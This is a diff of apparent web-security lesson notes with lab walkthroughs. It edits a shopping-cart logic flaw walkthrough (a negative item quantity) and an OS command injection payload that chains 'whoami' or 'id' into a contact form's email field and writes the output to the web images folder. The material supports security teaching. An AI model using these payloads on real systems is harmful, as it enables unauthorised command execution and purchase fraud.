@@ -88,8 +88,7 @@ Most security problems are weaknesses in an application that result from a broke
 //walkthrough
 log in with weiner : peter and add the jacket to your cart
 check the http history and give it a look, 
-if you go negative with it you can get a negative balance and then you can balance out the transaction 
-make sure you use intercept
+if you go negative with the quantity you can get a negative balance and then you can balance out the transaction
 
 ### Student Lab (5 Mins) 
 
@@ -143,7 +142,7 @@ csrf=0pmJEQphMpXzJH6DZ24qLkxUgeWCZ95g&name=asdf&email=asdffsd%40gmail.com||ping+
 //walkthrough
 open any item and check the image location then add your output to it
 https://0a8e003a03edd6b0c07c39a800c800f4.web-security-academy.net/image?filename=output.txt
-csrf=tUtP0VJ2JE9m9JyBb5ck8TnPI7oWxiri&name=asfd&email=x%40gmail.com||whoami>/var/www/images/output.txt||&subject=afd&message=safd
+csrf=tUtP0VJ2JE9m9JyBb5ck8TnPI7oWxiri&name=asfd&email=x%40gmail.com||id>/var/www/images/output.txt||&subject=afd&message=safd
 
 ## Discussion Server Side Request Forgery (10 Mins)
 
